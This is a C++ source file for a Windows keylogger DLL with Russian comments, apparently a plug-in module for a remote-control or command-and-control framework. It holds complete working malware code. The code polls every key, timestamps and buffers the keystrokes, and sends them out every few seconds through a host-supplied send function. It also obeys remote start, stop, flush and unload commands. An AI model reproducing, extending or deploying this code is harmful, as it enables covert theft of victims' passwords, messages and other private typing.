// Modules/Keylogger/keylogger.cpp — FINAL POLLING VERSION
// Компиляция: cl /LD /MT /O2 keylogger.cpp /Fe:keylogger.dll user32.lib kernel32.lib

#include <windows.h>
#include <stdio.h>
#include <string.h>

struct ModuleAPI {
    void (*send_result)(const unsigned char* data, unsigned long long len);
    void (*log)(const char* msg);
    const char* (*get_command)(const char* key);
};

// Глобальное состояние
static bool g_recording = true;
static volatile bool g_running = true;
static CRITICAL_SECTION g_cs;
static char g_buffer[8192];
static int g_buf_len = 0;
static DWORD g_last_send_tick = 0;

// Отслеживание состояния клавиш (чтобы не дублировать зажатые кнопки)
static bool g_key_state[256] = {false};

// Безопасные копии API-указателей
static void (*g_send_result)(const unsigned char*, unsigned long long) = nullptr;
static void (*g_log)(const char*) = nullptr;
static const char* (*g_get_command)(const char*) = nullptr;

// Хелпер для записи в файл
void kl_log(const char* msg) {
    CreateDirectoryA("C:\\temp", NULL);
    HANDLE h = CreateFileA("C:\\temp\\kl_debug.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        SetFilePointer(h, 0, NULL, FILE_END);
        DWORD w; WriteFile(h, msg, (DWORD)strlen(msg), &w, NULL);
        CloseHandle(h);
    }
    if (g_log) g_log(msg);
}

// Поток опроса клавиатуры
DWORD WINAPI KeyloggerWorker(LPVOID) {
    if (!g_send_result) { kl_log("KL: No send_result API\n"); return 1; }
    kl_log("KL: Worker started (Polling Mode)\n");

    g_last_send_tick = GetTickCount();
    memset(g_key_state, 0, sizeof(g_key_state));

    while (g_running) {
        Sleep(40); // 25 проверок в секунду

        // Опрос всех виртуальных кодов клавиш
        for (int vk = 8; vk < 255; vk++) {
            if (GetAsyncKeyState(vk) & 0x8000) {
                if (!g_key_state[vk]) {
                    g_key_state[vk] = true;

                    char keyName[64] = {0};
                    UINT scan = MapVirtualKeyA(vk, MAPVK_VK_TO_VSC);
                    if (scan > 0) {
                        GetKeyNameTextA(scan << 16, keyName, sizeof(keyName));
                    }
                    if (strlen(keyName) == 0) {
                        sprintf_s(keyName, "[VK:%d]", vk);
                    }

                    SYSTEMTIME st; GetLocalTime(&st);
                    char ts[32];
                    sprintf_s(ts, "[%02d:%02d:%02d.%03d] ", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

                    EnterCriticalSection(&g_cs);
                    int ts_len = (int)strlen(ts);
                    int name_len = (int)strlen(keyName);
                    int needed = ts_len + name_len + 2;

                    if (g_buf_len + needed < sizeof(g_buffer) - 50) {
                        memcpy(g_buffer + g_buf_len, ts, ts_len);
                        g_buf_len += ts_len;
                        memcpy(g_buffer + g_buf_len, keyName, name_len);
                        g_buf_len += name_len;
                        g_buffer[g_buf_len++] = '\n';
                    }
                    LeaveCriticalSection(&g_cs);
                }
            } else {
                if (g_key_state[vk]) {
                    g_key_state[vk] = false;
                }
            }
        }

        // Обслуживание буфера
        if (GetTickCount() - g_last_send_tick > 5000 || g_buf_len > 4096) {
            EnterCriticalSection(&g_cs);
            if (g_buf_len > 0) {
                char* temp = (char*)HeapAlloc(GetProcessHeap(), 0, g_buf_len + 20);
                if (temp) {
                    memcpy(temp, g_buffer, g_buf_len);
                    temp[g_buf_len] = 0;
                    g_buf_len = 0;
                    LeaveCriticalSection(&g_cs);
                    
                    // === FIX: Заменяем внутренние \n на | ===
                    for (int i = 0; i < (int)strlen(temp); i++) {
                        if (temp[i] == '\n' || temp[i] == '\r') {
                            temp[i] = '|';
                        }
                    }
                    // =======================================

                    const char prefix[] = "KEYLOG_DATA:";
                    int total_len = (int)strlen(prefix) + (int)strlen(temp) + 1;
                    unsigned char* out = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, total_len);
                    
                    if (out) {
                        memcpy(out, prefix, strlen(prefix));
                        memcpy(out + strlen(prefix), temp, strlen(temp));
                        out[total_len-1] = '\n';
                        
                        g_send_result(out, total_len);
                        
                        char log_msg[128];
                        sprintf_s(log_msg, "KL: SENT %d bytes\n", total_len);
                        kl_log(log_msg);
                        HeapFree(GetProcessHeap(), 0, out);
                    }
                    HeapFree(GetProcessHeap(), 0, temp);
                } else { LeaveCriticalSection(&g_cs); }
                g_last_send_tick = GetTickCount();
            } else {
                LeaveCriticalSection(&g_cs);
            }
        }
        
        // Проверка команд
        if (g_get_command) {
            const char* cmd = g_get_command("keylogger");
            if (cmd) {
                if (strstr(cmd, "keylog_stop")) g_recording = false;
                else if (strstr(cmd, "keylog_start")) g_recording = true;
                else if (strstr(cmd, "keylog_send")) g_last_send_tick = 0;
                else if (strstr(cmd, "keylog_unload")) g_running = false;
            }
        }
    }
    
    kl_log("KL: Stopped\n");
    return 0;
}

extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
    if (!api) return -1;
    g_send_result = api->send_result;
    g_log = api->log;
    g_get_command = api->get_command;
    
    InitializeCriticalSection(&g_cs);
    CreateThread(NULL, 0, KeyloggerWorker, NULL, 0, NULL);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        kl_log("KL: DLL_ATTACH\n");
    }
    if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        g_running = false;
    }
    return TRUE;
}